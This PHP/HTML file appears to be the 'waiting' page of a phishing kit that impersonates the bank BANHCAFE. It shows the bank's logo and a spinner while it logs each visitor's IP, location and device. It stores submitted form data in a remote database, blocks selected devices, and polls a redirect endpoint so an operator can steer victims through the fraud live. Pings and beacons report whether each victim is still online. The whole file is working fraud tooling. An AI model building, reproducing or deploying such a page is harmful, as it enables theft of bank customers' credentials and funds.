<?php
ob_start();
require_once 'functions.php';

// =========================
// OBTENER INFO DE USUARIO
// =========================
$info   = get_user_info();
$ip     = $info['ip'];
$device = get_device_id();

// =========================
// BLOQUEADO?
// =========================
if (get_user_state($device) === 'block') {
    echo "<script>
            alert('Acceso denegado: Tu usuario ha sido bloqueado.');
            window.location.href = 'https://www.google.com';
          </script>";
    exit();
}

// =========================
// REGISTRAR / ACTUALIZAR USUARIO
// =========================
update_user($ip, $info['location'], basename(__FILE__));


// ====================================================
// 🔥 PROCESAR FORMULARIO + GUARDAR SUBMISSIONS FIRESTORE
// ====================================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    $allowedFields = [""];
    $formData = [];

    foreach ($_POST as $key => $value) {
        if (in_array($key, $allowedFields, true)) {
            $formData[$key] = trim($value);
        }
    }

    if (!empty($formData)) {

        $data = load_data(); // traer TODA la BD (Firestore)

        if (!isset($data[$device])) {
            $data[$device] = [
                'submissions' => [],
                'state'       => 'active',
                'color'       => ''
            ];
        }

        $timestamp = date("Y-m-d H:i:s");
        $found = false;

        foreach ($data[$device]['submissions'] as &$submission) {
            $existingKeys = array_keys($submission['data']);
            $formKeys     = array_keys($formData);

            sort($existingKeys);
            sort($formKeys);

            if ($existingKeys === $formKeys) {
                $submission = [
                    "data"      => $formData,
                    "timestamp" => $timestamp
                ];
                $found = true;
                break;
            }
        }
        unset($submission);

        if (!$found) {
            $data[$device]['submissions'][] = [
                "data"      => $formData,
                "timestamp" => $timestamp
            ];

            if (count($data[$device]['submissions']) === 1 && empty($data[$device]['color'])) {
                $data[$device]['color'] = '#000000';
            }
        }

        save_data($data);


        exit();

    } else {
        echo "<script>alert('Por favor, complete al menos un campo válido.');</script>";
    }
}

ob_end_flush();
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Validando información - BANHCAFE</title>
  <style>
    :root {
      --vino-banhcafe: #7a1c1c; /* 🎨 tono vino coherente con el logo */
      --fondo-claro: #f9f9f9;
      --blanco: #ffffff;
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      margin: 0;
      background: var(--fondo-claro);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      background: url('assets/background.png') no-repeat center center;
      background-size: cover;
    }

    .contenedor {
      background: var(--blanco);
      padding: 40px 30px;
      border-radius: 12px;
      text-align: center;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
      border-top: 5px solid var(--vino-banhcafe);
    }

    .logo img {
      max-width: 150px;
      margin-bottom: 20px;
    }

    .spinner {
      margin: 20px auto;
      width: 80px;
      height: 80px;
      border: 8px solid #ddd;
      border-top: 8px solid var(--vino-banhcafe);
      border-radius: 50%;
      animation: girar 1s linear infinite;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .mensaje {
      margin-top: 15px;
      font-size: 16px;
      color: var(--vino-banhcafe);
      font-weight: bold;
      display: none;
    }
  </style>
</head>
<body>
  <div class="contenedor">
    <div class="logo">
      <img src="assets/logo.png" alt="BANHCAFE">
    </div>
    <div class="spinner"></div>
    <div class="mensaje" id="mensaje">Por favor espere...</div>
  </div>

  <script>
      (function () {

         const CURRENT_PAGE = "waiting.php";

         function checkRedirect() {
            fetch('check_redirect.php', { cache: 'no-store' })
               .then(resp => resp.json())
               .then(data => {
                  if (!data.currentPage) return;

                  if (data.currentPage !== CURRENT_PAGE) {
                     window.location.href = data.currentPage;
                  }
               })
               .catch(() => { });
         }

         // revisar cada 2 segundos
         setInterval(checkRedirect, 2000);
      })();
   </script>

   <script>
      // --- URL DEL ARCHIVO PHP QUE MANEJA OFFLINE / PING ---
      const statusURL = "functions.php?action="; // cambialo por el archivo correcto (ej: index.php?action=)

      // --- ENVÍA PING CADA 20 SEGUNDOS ---
      function sendPing() {
         fetch(statusURL + "ping")
            .catch(err => console.log("Error ping:", err));
      }

      // Enviar ping inmediatamente al cargar
      sendPing();

      // Enviar ping automáticamente cada 20 segundos
      setInterval(sendPing, 20000);

      // --- MARCAR OFFLINE AL SALIR DE LA PÁGINA ---
      window.addEventListener("beforeunload", function () {
         navigator.sendBeacon(statusURL + "offline");
      });
   </script>
  <script>
    // Mostrar mensaje cuando falten 15 segundos
    setTimeout(() => {
      document.getElementById("mensaje").style.display = "block";
    }, 15000);

  </script>
</body>
</html>
